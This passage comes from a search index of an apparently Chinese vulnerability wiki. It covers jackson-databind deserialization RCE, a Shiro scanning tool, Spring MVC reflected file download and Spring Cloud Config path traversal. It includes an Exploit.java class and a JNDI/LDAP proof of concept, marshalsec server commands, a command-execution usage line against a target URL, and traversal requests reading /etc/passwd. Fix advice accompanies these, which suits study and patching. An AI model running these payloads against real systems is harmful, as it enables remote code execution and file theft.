2.9.10.6\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u8f7d\u8377\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u7cfb\u7edf\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>jackson-databind &lt; 2.9.10.6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_3","title":"\u5b89\u5168\u7248\u672c","text":"<p>jackson-databind 2.9.10.6 jackson-databind 2.10</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_4","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>1.\u5efa\u8bae\u7528\u6237\u5c06jackson-databind\u7ec4\u4ef6\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c\u3002 https://github.com/FasterXML/jackson-databind/releases 2.\u5728Jackson 2.10 \u4e2d\u5f15\u5165\u4e86Safe Default Typing\u767d\u540d\u5355\u673a\u5236\uff0c\u53ef\u675c\u7edd\u6b64\u7c7bgadget\u7684\u5f71\u54cd\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#poc","title":"POC","text":"<p>\u628a\u7f16\u8bd1\u597d\u7684exploit.class\u653e\u7f6e\u5728\u670d\u52a1\u7aef \u5f00\u542fHTTP\u670d\u52a1<code>python3 -m http.server 8888</code>\u6216\u8005tomcat\u90fd\u884c \u542f\u52a8LDAP``` java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u201chttp://x.x.x.x(\u670d\u52a1\u7aefIp):8888/#Exploit\u201d 9999 </p> <p>PS:poc\u4e2d\u7684\u7aef\u53e3\u53f7\u8981\u548cLDAP\u7684\u5bf9\u5e94 \u672c\u5730\u8fd0\u884cjavaPOC  cve-2020-24616-poc-master</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/","title":"jackson-databind RCE CVE-2020-9548","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u2022 jackson-databind before 2.9.10.4 \u2022 jackson-databind before 2.8.11.6 \u2022 jackson-databind before 2.7.9.7</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_2","title":"\u6f0f\u6d1e\u7c7b\u578b","text":"<p>JDNI\u6ce8\u5165\u5bfc\u81f4RCE \u5229\u7528\u6761\u4ef6 \u2022 \u5f00\u542fenableDefaultTyping() \u2022 \u4f7f\u7528\u4e86br.com.anteros.dbcp.AnterosDBCPConfig\u7b2c\u4e09\u65b9\u4f9d\u8d56</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_3","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>2020\u5e743\u6708\uff0cjackson-databind\u5728github\u4e0a\u66f4\u65b0\u4e86\u4e00\u4e2a\u65b0\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7c7bbr.com.anteros.dbcp.AnterosDBCPConfig\uff0c\u8be5\u7c7b\u7ed5\u8fc7\u4e86\u4e4b\u524djackson-databind\u7ef4\u62a4\u7684\u9ed1\u540d\u5355\u7c7b\uff0c\u5e76\u4e14JDK\u7248\u672c\u8f83\u4f4e\u7684\u8bdd\uff0c\u53ef\u9020\u6210RCE\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u73af\u5883\u642d\u5efa pom.xml\uff1a</p> <pre><code> &lt;dependencies&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;\n      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;\n      &lt;version&gt;2.9.9.1&lt;/version&gt;\n    &lt;/dependency&gt;\n      &lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;\n      &lt;dependency&gt;\n          &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;\n          &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;\n          &lt;version&gt;1.0.1&lt;/version&gt;\n      &lt;/dependency&gt;\n      &lt;dependency&gt;\n      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n      &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;\n      &lt;version&gt;1.7.2&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;\n      &lt;dependency&gt;\n          &lt;groupId&gt;javax.transaction&lt;/groupId&gt;\n          &lt;artifactId&gt;jta&lt;/artifactId&gt;\n          &lt;version&gt;1.1&lt;/version&gt;\n      &lt;/dependency&gt;\n  &lt;/dependencies&gt;\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_5","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u7f16\u8bd1Exploit.java Exploit.java\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>import java.lang.Runtime;\n\npublic class Exploit {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre> <p>\u642d\u5efaHTTP\u670d\u52a1 \u4f7f\u7528Python\u642d\u5efa\u7b80\u6613SimpleHTTPServer\u670d\u52a1\uff1a</p> <p>\u642d\u5efaLDAP\u670d\u52a1 \u4f7f\u7528marshalsec\u6765\u542f\u52a8\u4e00\u4e2aLDAP\u670d\u52a1\uff1a</p> <p>\u6267\u884c\u6f0f\u6d1ePOC1 Poc.java\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>package com.jacksonTest;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\n\npublic class Poc {\n    public static void main(String[] args) throws Exception {\n       ObjectMapper mapper = new ObjectMapper();\n        mapper.enableDefaultTyping();\n        String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\";\n        try {\n            mapper.readValue(payload, Object.class);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre> <p>\u4e4b\u540e\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u6267\u884c\u547d\u4ee4\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_6","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u9996\u5148\u5b9a\u4f4d\u5230br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\uff0c\u4e4b\u540e\u53d1\u73b0\u4e00\u5904\u53ef\u7591\u7684JNDI\u6ce8\u5165\uff1a</p> <p>\u7531\u4e8e\u53c2\u6570\u6765\u81eaobject\uff0c\u6240\u4ee5\u4e4b\u540e\u5168\u5c40\u641c\u7d22\u8c03\u7528getObjectOrPerformJndiLookup\u51fd\u6570\u8c03\u7528\u7684\u5730\u65b9\u53d1\u73b0setMetricRegistry\u5904\u6709\u4e00\u5904\u53ef\u63a7\u7684\u8c03\u7528\uff0c\u6b64\u5904\u7684\u53c2\u6570metricRegistry\u53ef\u6709json\u6307\u5b9a\uff0c\u4e4b\u540e\u4f20\u5165getObjectOrPerformJndiLookup\uff0c\u4e4b\u540e\u518d\u6b21\u4f20\u5165lookup\uff0c\u4ece\u800c\u5bfc\u81f4JNDI\u6ce8\u5165\u7684\u53d1\u751f\uff0c\u5e76\u6700\u7ec8\u5bfc\u81f4RCE:</p> <p>\u6574\u4e2a\u5229\u7528\u94fe\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>mapper.readValue\n    -&gt;setMetricRegistry\n        -&gt;getObjectOrPerformJndiLookup\n             -&gt;lookup\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/#_7","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u2022 \u53ca\u65f6\u5c06jackson-databind\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c \u2022 \u5347\u7ea7\u5230\u8f83\u9ad8\u7248\u672c\u7684JDK\u3002 \u53c2\u8003\u94fe\u63a5 https://github.com/FasterXML/jackson-databind/issues/2634</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/","title":"ShiroScan","text":"<p>Shiro&lt;=1.2.4\u53cd\u5e8f\u5217\u5316\uff0c\u4e00\u952e\u68c0\u6d4b\u5de5\u5177</p> <pre><code>\u6539\u52a8\u5185\u5bb9\uff1a1.\u65b0\u589e4\u4e2a\u5229\u7528\u94fe\u6a21\u5757(CommonsCollections7-10)\uff0c\u9884\u8ba1\u589e\u52a0\u6210\u529f\u738730%\uff0c\u5df2\u6253\u5305\u6210\u65b0ysoserial\u7684jar\u5305\uff0c\u8bf7\u52ff\u66f4\u6362\n\u6539\u52a8\u5185\u5bb9\uff1a2.\u589e\u52a0\u591a\u7ebf\u7a0b\uff0c\u867d\u6a21\u5757\u589e\u52a0\u4f46\u901f\u5ea6\u5374\u63d0\u9ad8300%\n</code></pre> <pre><code>\u96c6\u621021\u4e2akey\u8fdb\u884cfuzz\n</code></pre> <ul> <li>\u5982\u679c\u6709\u5e2e\u52a9\uff0c\u8bf7\u70b9\u4e2astar\u54e6\uff0c\u5bf9\u5e94blog\u6587\u7ae0\uff1ahttp://www.svenbeast.com/post/tskRKJIPg/</li> <li> <p>pip3 install -r requirments.txt     </p> </li> <li> <p>Usage\uff1apython3 shiro.py  url  command</p> </li> <li> <p>Usage\uff1apython3 shiro.py  https://url.com  whoami</p> </li> <li> <p>http://www.dnslog.cn/   \u9a8c\u8bc1\u63a8\u8350\u4f7f\u7528\u8fd9\u4e2adnslog\u5e73\u53f0\uff0c\u901f\u5ea6\u6bd4ceye.io\u8981\u5feb\u5f88\u591a</p> </li> <li> <p>\u6267\u884c\u7684\u547d\u4ee4\u5e26\u7a7a\u683c\u8bb0\u5f97\u7528\"\"\u5f15\u8d77\u6765</p> </li> <li> <p>usage\uff1apython3 shiro.py  http://url.com  \"ping dnslog.cn\"</p> </li> <li> <p>11\u4e2a\u6a21\u5757\u5168\u90e8\u8dd1\u4e00\u904d,\u7136\u540e\u53bbdnslog\u5e73\u53f0\u67e5\u770b\u662f\u5426\u6536\u5230\u8bf7\u6c42\uff0c\u4e0d\u51fa\u6765\u5c31GG\uff0c\u4e5f\u53ef\u80fd\u662f\u56e0\u4e3a\u7f16\u7801\u8fd8\u4e0d\u591f\u591a</p> </li> <li> <p>\u8bf7\u81ea\u884c\u6536\u96c6\u7f16\u7801\uff0c\u5728moule\u4e0b\u7684\u6e90\u4ee3\u7801\u4e2d\u81ea\u884c\u6dfb\u52a0\u65b9\u6cd5\u5373\u53ef</p> </li> <li> <p>\u4e3a\u4e86\u811a\u672c\u8fd0\u884c\u7b80\u5355\uff0c\u591a\u7ebf\u7a0b\u6570\u91cf\u4e0d\u662f\u4f7f\u7528\u8005\u4f20\u53c2\u63a7\u5236\uff0c\u9ed8\u8ba420\u7ebf\u7a0b\uff0c\u5982\u9700\u6539\u52a8\u8bf7\u5230/moule/main.py\u7b2c20\u884c\u4ee3\u7801\u81ea\u884c\u4fee\u6539\u63a7\u5236\u7ebf\u7a0b\u7684\u53c2\u6570</p> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/#exp","title":"\u4e0d\u63a8\u8350\u5f53\u505aexp\u4f7f\u7528\uff0c\u6548\u7387\u95ee\u9898","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/ShiroScan-master/#_1","title":"\u4ec5\u4f9b\u5b89\u5168\u4eba\u5458\u9a8c\u8bc1,\u6d4b\u8bd5\u662f\u5426\u5b58\u5728\u6b64\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/","title":"CVE-2020-5398-Spring MVC\u7684RFD\uff08\u53cd\u5c04\u6587\u4ef6\u4e0b\u8f7d\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u4e8e\u5f53\u5730\u65f6\u95f41\u670816\u65e5\uff0c Pivotal Software\uff08Spring\u7cfb\u5217\uff09\u5b98\u65b9\u53d1\u5e03 Spring Framework \u5b58\u5728 RFD\uff08\u53cd\u5c04\u578b\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff09\u7684\u6f0f\u6d1e\u62a5\u544a\uff0c\u6b64\u6f0f\u6d1e\u4e3a\u653b\u51fb\u5ba2\u6237\u7aef\u7684\u6f0f\u6d1e\uff0c\u5b98\u65b9\u5c06\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u8bc4\u4e3a\u9ad8\u3002\u62a5\u544a\u6307\u51fa\uff0c\u5f53\u54cd\u5e94\u4e2d\u8bbe\u7f6e\u4e86\u201cContent-Disposition\u201d\u5934\u4e14filename\u5c5e\u6027\u662f\u7528\u6237\u53ef\u63a7\u65f6\u5bb9\u6613\u53d7\u5230RFD\u653b\u51fb\u3002\u653b\u51fb\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6240\u6709\u6761\u4ef6\u624d\u53ef\u6210\u529f\uff1a 1.header\u4f7f\u7528org.springframework.http.ContentDisposition\u6765\u9884\u5907 2.\u6587\u4ef6\u540d\u662f\u901a\u8fc7ContentDisposition.Builder#filename(String) \u6216 ContentDisposition.Builder#filename(String, US_ASCII)\u6765\u8bbe\u7f6e\u3002 3.\u6587\u4ef6\u540d\uff08\u5305\u62ec\u6587\u4ef6\u540d\u540e\u7f00\uff09\u4e3a\u7528\u6237\u53ef\u63a7\u3002 4.\u653b\u51fb\u8005\u5df2\u5c06\u4e0b\u8f7d\u7684\u54cd\u5e94\u5185\u5bb9\u6ce8\u5165\u6076\u610f\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u5229\u7528RFD\u6f0f\u6d1e\uff0c\u7ed3\u5408\u793e\u5de5\u7b49\u65b9\u5f0f\uff0c\u8ba9\u7528\u6237\u4e0b\u8f7d\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u4ece\u800c\u5371\u5bb3\u7528\u6237\u7684\u7ec8\u7aef\u5b89\u5168\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Spring Framework 5.2.0 to 5.2.2\uff0c5.1.0 to 5.1.12\uff0c5.0.0 to 5.0.15</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#poc","title":"POC","text":"<p><code>GET /?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP/1.1 Host: 192.168.248.129:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1</code></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5347\u7ea7\u81f3 Spring Framework 5.2.3\uff0c5.1.13 \u6216 5.0.16 \u7248\u672c\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/Spring%20Cloud%20Config%20Server%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","title":"\u6f0f\u6d1e\u516c\u544a","text":"<p>https://pivotal.io/security/cve-2019-3799</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/Spring%20Cloud%20Config%20Server%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u73af\u5883\u642d\u5efa\uff1a https://github.com/spring-cloud/spring-cloud-config#quick-start</p> <pre><code>GET /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.1\nHost: localhost:8888\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/Spring%20Cloud%20Config%20Server%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>Spring Cloud Config\u662fSpirng Cloud\u4e0b\u7528\u4e8e\u5206\u5e03\u5f0f\u914d\u7f6e\u7ba1\u7406\u7684\u7ec4\u4ef6\uff0c\u5206\u4e3a<code>Config-Server</code>\u548c<code>Config-Client</code>\u4e24\u4e2a\u89d2\u8272\u3002 <code>Config-Server</code>\u8d1f\u8d23\u96c6\u4e2d\u5b58\u50a8/\u7ba1\u7406\u914d\u7f6e\u6587\u4ef6\uff0c<code>Config-Client</code>\u5219\u53ef\u4ee5\u4ece<code>Config-Server</code>\u63d0\u4f9b\u7684HTTP\u63a5\u53e3\u83b7\u53d6\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u30022019\u5e744\u670816\u65e5\uff0cPivotal\u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u901a\u544a\uff0cSpring Cloud Config Server \u90e8\u5206\u7248\u672c\u5b58\u5728\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff0c\u636e\u6b64\u53ef\u4ee5\u83b7\u53d6Server\u7aef\u670d\u52a1\u5668\u6587\u4ef6\u3002</p> <p>\u6839\u636e\u5b98\u65b9\u6587\u6863\uff0c\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u8bf7\u6c42<code>GET /{name}/{profile}/{label}/{path}</code> \u6765\u83b7\u53d6\u914d\u7f6e\u6587\u4ef6\uff0c<code>name</code>\uff0c<code>profile</code>\u548c<code>label</code>\u7684\u542b\u4e49\u4e0e\u5e38\u89c4\u73af\u5883\u4e0b\u7684endpoint\u76f8\u540c\uff0c\u800c<code>path</code>\u662f\u6307\u6587\u4ef6\u540d\u3002\u4ee5\u5b98\u65b9\u793a\u4f8b\u4e3a\u73af\u5883\uff0c\u6211\u4eec\u8bf7\u6c42 https://github.com/spring-cloud-samples/config-repo/blob/master/test.json \u8fd9\u4e2a\u6587\u4ef6\u5e76\u4ee5\u6587\u672c\u5f62\u5f0f\u8fd4\u56de \uff0c\u5219\u6211\u4eec\u9700\u8981\u5411<code>Spring Cloud Config Server</code>\u53d1\u51fa\u5982\u4e0b\u8bf7\u6c42\uff1a</p> <pre><code>GET http://127.0.0.1:8888/foo/label/master/test.json\n</code></pre> <p></p> <p>\u6839\u636e\u8bf7\u6c42\u683c\u5f0f\u53ef\u4ee5\u5728 <code>org/springframework/cloud/config/server/resource/ResourceController.java:54</code> \u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u5904\u7406 <code>@RequestMapping(\"/{name}/{profile}/{label}/**\")</code>\uff1a</p> <p></p> <p>\u5176\u4e2d<code>path</code>\u503c\u5373\u4e3apayload:<code>..%2F..%2F..%2F..%2Fetc%2fpasswd</code></p> <p>\u8ddf\u5165<code>retrieve</code> \u5728<code>org/springframework/cloud/config/server/resource/ResourceController.java:104</code> \uff1a</p> <pre><code>synchronized String retrieve(ServletWebRequest request, String name, String profile,\n            String label, String path, boolean resolvePlaceholders) throws IOException {\n        name = resolveName(name);\n        label = resolveLabel(label);\n        Resource resource = this.resourceRepository.findOne(name, profile, label, path);\n        ...\n    }\n</code></pre> <p>\u8fd9\u91cc\u4f1a\u6839\u636e\u524d\u9762\u6240\u4f20\u6761\u4ef6\u83b7\u53d6\u5230resource\u3002\u6587\u6863\u4e2d\u63d0\u5230<code>only the first one to match is returned</code>\uff0c\u6240\u4ee5\u7ee7\u7eed\u8ddf\u5165<code>findOne</code>:</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc<code>locations</code>\u7684\u503c\u4e3a<code>file:/tmp/config-repo-7168113927339570935/</code>\uff0c\u8fd9\u662f<code>Config-Server</code>\u4ece\u540e\u7aef\u62c9\u53d6\u5230\u914d\u7f6e\u6587\u4ef6\u65f6\u4e34\u65f6\u5b58\u653e\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u5c06\u4f1a\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u8fdb\u884c\u6587\u4ef6\u7684\u67e5\u627e\uff0c\u6bd4\u5982<code>test.json</code>\uff1a</p> <p></p> <p>\u4e0d\u8fc7\u6211\u4eec\u4f20\u5165\u7684\u5374\u662f<code>..%2F..%2F..%2F..%2Fetc%2fpasswd</code>\uff0c\u6700\u7ec8\u62fc\u63a5\u51fa\u6765\u7684\u6587\u4ef6url\u5373\u4e3a\uff1a</p> <p></p> <p>\u8fd4\u56de\u540e\u83b7\u53d6\u5230\u7684<code>resource</code>\u5373\u4e3a<code>/etc/passwd</code>\uff0c\u8c03\u7528<code>StreamUtils.copyToString(is, Charset.forName(\"UTF-8\")</code>\u8bfb\u53d6\u5230\u6587\u4ef6\u5185\u5bb9\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/Spring%20Cloud%20Config%20Server%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_4","title":"\u6f0f\u6d1e\u8865\u4e01","text":"<p>https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</p> <p>\u4e3b\u8981\u5728\u83b7\u53d6\u5230local\u540e\u8fdb\u884c\u4e86\u5224\u65ad\uff1a</p> <pre><code>if (!isInvalidPath(local) &amp;&amp; !isInvalidEncodedPath(local)) {\n    Resource file = this.resourceLoader.getResource(location)\n            .createRelative(local);\n    if (file.exists() &amp;&amp; file.isReadable()) {\n        return file;\n    }\n}\n</code></pre> 